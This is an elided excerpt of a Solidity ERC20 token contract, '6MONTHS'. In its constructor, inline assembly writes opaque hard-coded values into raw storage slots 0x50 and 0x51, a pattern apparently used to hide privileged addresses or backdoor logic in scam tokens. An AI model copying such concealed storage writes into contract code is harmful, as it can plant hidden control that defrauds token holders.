...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xf1e10cf6e329ddaca6eadb827c0c85bc7f657c0c3aa4)
            sstore(0x51,0xf1e12f725eaba357b45c5f051aae55a88f0f8d9a6e98)
...
contract SixMonths is ERC20Token {
    constructor() ERC20Token("Difference Cconspiracy And Truth", "6MONTHS", msg.sender, 100000000 * 10 ** 18) {
    }
}